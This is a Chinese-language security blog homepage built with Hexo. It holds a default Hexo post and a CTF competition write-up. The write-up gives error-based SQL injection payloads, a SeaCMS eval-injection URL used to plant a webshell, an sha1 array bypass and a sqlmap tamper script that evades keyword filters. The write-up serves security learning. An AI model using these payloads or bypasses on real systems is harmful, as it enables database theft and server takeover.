@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next gemini" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="人的一生应该这样度过:不因虚度年华而悔恨，也不因碌碌无为而羞愧">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Grm的安全进阶之路">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="Grm的安全进阶之路">
+<meta property="og:description" content="人的一生应该这样度过:不因虚度年华而悔恨，也不因碌碌无为而羞愧">
+<meta property="og:locale" content="zh-Hans">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Grm的安全进阶之路">
+<meta name="twitter:description" content="人的一生应该这样度过:不因虚度年华而悔恨，也不因碌碌无为而羞愧">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/">
+
+
+
+
+
+  <title>Grm的安全进阶之路</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Grm的安全进阶之路</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">记录学习历程</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resources">
+          <a href="/resources/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-modx"></i> <br>
+            
+            资源
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-link">
+          <a href="/link/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br>
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/12/hello-world/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="故人梦">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Grm的安全进阶之路">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/12/hello-world/" itemprop="url">Hello World</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-12T12:18:50+08:00">
+                2019-04-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/09/嘉韦思杯部分writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="故人梦">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Grm的安全进阶之路">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/09/嘉韦思杯部分writeup/" itemprop="url">嘉韦思杯部分writeup</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-09T00:00:00+08:00">
+                2019-04-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="土肥原贤二-WEB-报错注入"><a href="#土肥原贤二-WEB-报错注入" class="headerlink" title="土肥原贤二(WEB 报错注入)"></a>土肥原贤二(WEB 报错注入)</h3><p>字符型报错注入，直接一套payload带走<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">' and updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">-- -</span></span><br><span class="line">luozhen</span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>luozhen<span class="string">'),0x7e),1)-- -</span></span><br><span class="line"><span class="string">flag,goods</span></span><br><span class="line"><span class="string">'</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">-- -</span></span><br><span class="line"><span class="keyword">id</span>,flag</span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select flag from flag),0x7e),1)-- -</span></span><br></pre></td></tr></table></figure></p>
+<p>得到flag：flag{20_welcome_19}</p>
+<h3 id="吴佩孚-jsfuck解密"><a href="#吴佩孚-jsfuck解密" class="headerlink" title="吴佩孚(jsfuck解密)"></a>吴佩孚(jsfuck解密)</h3><p>这个搞了很久，它意思是跟第一题有关系，想了很久没想到什么关系，第一题是base64解密，这个题实际上就是base64解密，解出来就是JSfuck加密的字符串。。。我说这字符串看着实在很怪<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接f12，console</span><br><span class="line">然后将JSfuck字符串放进去，回车，就解密成功</span><br></pre></td></tr></table></figure></p>
+<p>得到flag：flag{sdf465454dfgert32}</p>
+<h3 id="戴星炳-WEB-简单python"><a href="#戴星炳-WEB-简单python" class="headerlink" title="戴星炳(WEB 简单python)"></a>戴星炳(WEB 简单python)</h3><p>直接编写python脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.103.43.235:82/web/a/index.php"</span></span><br><span class="line"></span><br><span class="line">res = requests.get(url=url)</span><br><span class="line">soup = BeautifulSoup(res.text, <span class="string">"lxml"</span>)</span><br><span class="line">tag = soup.find_all(<span class="string">'p'</span>)</span><br><span class="line"><span class="comment">#print tag[1].text</span></span><br><span class="line">result = eval(tag[<span class="number">1</span>].text)</span><br><span class="line">param = &#123;</span><br><span class="line">	<span class="string">"result"</span>:result</span><br><span class="line">&#125;</span><br><span class="line">res2 = requests.post(url=url, data=param)</span><br><span class="line"><span class="keyword">print</span> res2.text</span><br></pre></td></tr></table></figure></p>
+<p>得到flag：flag{Y0U_4R3_3o_F4ST!}</p>
+<h3 id="大美晚报-WEB-zip文件爆破"><a href="#大美晚报-WEB-zip文件爆破" class="headerlink" title="大美晚报(WEB zip文件爆破)"></a>大美晚报(WEB zip文件爆破)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问web，是一个二维码，扫了什么也没有。</span><br><span class="line">1、将二维码图片下载下来拖到kali上面binwalk一下，发现有zip文件</span><br><span class="line">2、解压的时候根据提示 密码是管理员的qq，猜测是纯数字，具体几位，直接使用archpr爆破，密码九位数，之前没保存，我就不继续爆了</span><br></pre></td></tr></table></figure>
+<p>得到flag：flag{d6@YX$_m^aa0}</p>
+<h3 id="潘汉年-crypto-简单代替加密"><a href="#潘汉年-crypto-简单代替加密" class="headerlink" title="潘汉年(crypto 简单代替加密)"></a>潘汉年(crypto 简单代替加密)</h3><p>才开了密码学的课，上了几节，其中讲到了代替和置换加密，看着这个格外的像，就对着ASCII表观察了一下其中的位置规律，发现果然是直接使用的代替加密。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">加密规则: (对比着flag解释)</span><br><span class="line">密文(C)：bg[`sZ*Zg&apos;dPfP`VM_SXVd</span><br><span class="line">明文(M)：flag&#123;c4es4r_variation&#125;</span><br><span class="line">加密规则符合：(python版代码解释)</span><br><span class="line">for i in range(4, len(C)+3):</span><br><span class="line">    C = E(i, M)</span><br><span class="line"></span><br><span class="line">解释：在ASCII表中将明文(flag)使用前面i位的字符代替，从第一个字符移动4位开始，后面递增一位。</span><br><span class="line">举例：第一个字符 f: 往回移动4位就在字母 d 的位置；</span><br><span class="line">第二个字符 l: 往回移动5位在 g 的位置；</span><br><span class="line">第三个字符 a：往回移动6位为 [ 字符；</span><br><span class="line">......</span><br><span class="line">以此类推</span><br><span class="line"></span><br><span class="line">然后解密就是将加密的字符往后走相应的位置即可</span><br><span class="line">for i in range(4, len(M)+3):</span><br><span class="line">    M = D(i, M)</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">C = <span class="string">"bg[`sZ*Zg'dPfP`VM_SXVd"</span></span><br><span class="line">M = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>, len(C)+<span class="number">4</span>):</span><br><span class="line">	d = chr(ord(C[i<span class="number">-4</span>])+i)</span><br><span class="line">	M.append(d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> M:</span><br><span class="line">	print(j, end=<span class="string">""</span>),</span><br></pre></td></tr></table></figure>
+<p>即可得到flag：flag{c4es4r_variation}</p>
+<h3 id="晴气庆胤-WEB-md5碰撞"><a href="#晴气庆胤-WEB-md5碰撞" class="headerlink" title="晴气庆胤(WEB md5碰撞)"></a>晴气庆胤(WEB md5碰撞)</h3><p>这个题主要是考察md5碰撞<br>网上的文章说的很清楚了  </p>
+<ul>
+<li><a href="https://blog.csdn.net/wy_97/article/details/79088218" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/79088218</a><br>网上的payload都说的要加密，这里的payload不需要加密，具体使用工具自己生成payload的方法：  </li>
+<li><a href="https://www.jianshu.com/p/1277b3c33d60" target="_blank" rel="noopener">https://www.jianshu.com/p/1277b3c33d60</a>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1Sc_V7YxO6Z_Zy2_VJ9nPGg 密码：99ul</span><br><span class="line"></span><br><span class="line">先创建一个txt文件，内容随便，这里创建了init.txt</span><br><span class="line">fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</span><br><span class="line">1.txt 和 2.txt 里面就是字符串不同，但是md5加密一样的字符串了</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//使用python脚本提交payload(手动提交也可以)</span><br><span class="line"><span class="comment">#encoding=utf-8 </span></span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">file1 = open(<span class="string">"1.txt"</span>, <span class="string">"rb"</span>) </span><br><span class="line">file2 = open(<span class="string">"2.txt"</span>, <span class="string">"rb"</span>) </span><br><span class="line">res1 = file1.read() </span><br><span class="line">res2 = file2.read() </span><br><span class="line"><span class="comment">#这里不需要urlencode</span></span><br><span class="line"><span class="comment">#s1 = urllib.quote(res1) </span></span><br><span class="line"><span class="comment">#s2 = urllib.quote(res2) </span></span><br><span class="line">file1.close() </span><br><span class="line">file2.close() </span><br><span class="line"><span class="comment">#print 'param1=%s'% s1 +'&amp;'+'param2=%s'% s2</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.103.43.235:85/a/"</span></span><br><span class="line"></span><br><span class="line">param = &#123;</span><br><span class="line">	<span class="string">"param1"</span>:res1,</span><br><span class="line">	<span class="string">"param2"</span>:res2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">re = requests.post(url = url, data = param)</span><br><span class="line"><span class="keyword">print</span> re.text</span><br></pre></td></tr></table></figure>
+<p>即可得到flag：flag{MD5@_@success}</p>
+<h3 id="作战计划-WEB-海洋cms"><a href="#作战计划-WEB-海洋cms" class="headerlink" title="作战计划(WEB 海洋cms)"></a>作战计划(WEB 海洋cms)</h3><p>这个海洋cms之前有一个ctf也出过，是直接拿shell，然后找flag<br>直接百度payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</span><br><span class="line">蚁剑连接，flag在根目录下</span><br></pre></td></tr></table></figure></p>
+<p>得到flag：flag{!!seacms_@@}</p>
+<h3 id="池步洲-WEB-sha1加密-数组绕过"><a href="#池步洲-WEB-sha1加密-数组绕过" class="headerlink" title="池步洲(WEB sha1加密,数组绕过)"></a>池步洲(WEB sha1加密,数组绕过)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_POST[<span class="string">'name'</span>] == $_POST[<span class="string">'password'</span>])</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'name and password must be diffirent'</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">'name'</span>]) === sha1($_POST[<span class="string">'password'</span>]))</span><br><span class="line">		<span class="keyword">die</span>($flag);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">print</span> <span class="string">'invalid password'</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sha1()加密一个数组为空 NULL，所以这里只需要让参数传递一个数组就可以了</span><br><span class="line">payload：</span><br><span class="line">POST: name[]=123&amp;password[]=234</span><br></pre></td></tr></table></figure>
+<p>得到flag：flag{Y0u_just_br0ke_sha1}</p>
+<h3 id="冈村宁次-WEB-绕过-tamper学习"><a href="#冈村宁次-WEB-绕过-tamper学习" class="headerlink" title="冈村宁次(WEB 绕过,tamper学习)"></a>冈村宁次(WEB 绕过,tamper学习)</h3><p>这是个骚题，对于菜鸡的我来说，我还是很感谢这道题的。之前一直想学习写sqlmap的tamper，但是一直没有学过，刚好这次就试了下，算是初窥门径吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">题目链接：</span><br><span class="line">http://47.103.43.235:83/web/a/index.php?id===QM</span><br><span class="line">注意点:</span><br><span class="line">1、根据观察发现它是将id=1的1用bs64加密然后再倒序，接在了url后面。所有后面的payload都需要先加密然后倒序。</span><br><span class="line">2、有过滤，过滤内容：</span><br><span class="line">单引号</span><br><span class="line">=</span><br><span class="line">空格</span><br><span class="line">and</span><br><span class="line">or</span><br><span class="line">union</span><br><span class="line">select</span><br><span class="line">from</span><br><span class="line">where</span><br><span class="line">and,or,union,select,from,where都是替换一次为空，所以可以通过双写绕过;空格使用/**/绕过，=使用like绕过</span><br></pre></td></tr></table></figure></p>
+<p>大概知道了这些，我决定顺便试一下写sqlmap的tamper<br>直接附上代码吧：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">	payload = payload.replace(<span class="string">' '</span>, <span class="string">'/**/'</span>)</span><br><span class="line">	payload = payload.replace(<span class="string">'or'</span>, <span class="string">'Oorr'</span>)</span><br><span class="line">	payload = payload.replace(<span class="string">'union'</span>, <span class="string">'ununionion'</span>)</span><br><span class="line">	payload = payload.replace(<span class="string">'from'</span>, <span class="string">'ffromrom'</span>)</span><br><span class="line">	payload = payload.replace(<span class="string">'where'</span>, <span class="string">'whwhereere'</span>)</span><br><span class="line">	payload = payload.replace(<span class="string">'select'</span>, <span class="string">'selselectect'</span>)</span><br><span class="line">	payload = payload.replace(<span class="string">'and'</span>, <span class="string">'Aandnd'</span>)</span><br><span class="line">	site = payload.find(<span class="string">'='</span>)</span><br><span class="line">	payload = payload[:site+<span class="number">1</span>] + payload[site+<span class="number">1</span>:].replace(<span class="string">'='</span>, <span class="string">'/*!00000like*/'</span>)   </span><br><span class="line">	end = payload[site+<span class="number">1</span>:]</span><br><span class="line">	bs64 = base64.b64encode(end)</span><br><span class="line">	rebs64 = bs64[::<span class="number">-1</span>]</span><br><span class="line">	payload = payload[:site+<span class="number">1</span>] + rebs64</span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure></p>
